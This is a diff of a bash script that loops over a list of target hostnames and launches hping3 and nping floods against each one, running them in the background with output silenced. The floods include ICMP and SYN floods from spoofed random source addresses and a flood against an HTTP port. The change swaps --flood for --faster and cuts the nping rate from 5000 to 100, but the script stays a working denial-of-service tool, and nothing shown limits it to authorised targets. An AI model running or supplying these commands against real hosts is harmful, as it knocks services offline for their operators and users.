@@ -96,14 +96,14 @@ do
             #sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source ${sitefqdn[$i]}  > /dev/null 2>&1 &
 
             echo -e "Running ping flood attack from random sources \r\n"
-            sudo hping3 ${sitefqdn[$i]} --icmp --flood --rand-source > /dev/null 2>&1 &
+            sudo hping3 ${sitefqdn[$i]} --faster --icmp --rand-source > /dev/null 2>&1 &
 
             #--- HTTP attacks ---
             echo -e "Running HPing3 flood attack to HTTP \r\n "
-            sudo hping3 ${sitefqdn[$i]} -p $port –SF --flood > /dev/null 2>&1 &
+            sudo hping3 ${sitefqdn[$i]} --faster -p $port –SF > /dev/null 2>&1 &
 
             echo -e "Running syn flood attack from random sources, towards a webserver \r\n "
-            sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport $port ${sitefqdn[$i]} > /dev/null 2>&1 &
+            sudo hping3 --faster --syn --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport $port ${sitefqdn[$i]} > /dev/null 2>&1 &
 
             #echo -e "Performing a NTP flood, from port NTP (Time Protocol) \r\n "
             #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 > /dev/null 2>&1 &
@@ -111,7 +111,7 @@ do
             #echo -e "Performing a TCP SYN Flood towards SSH \r\n"
             #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 > /dev/null 2>&1 &
 
-            RATE=5000
+            RATE=100
             SAMPLES=1000000000
             NPING_SILENT='-HNq'
             echo -e "Performing a ICMP Flood \r\n "
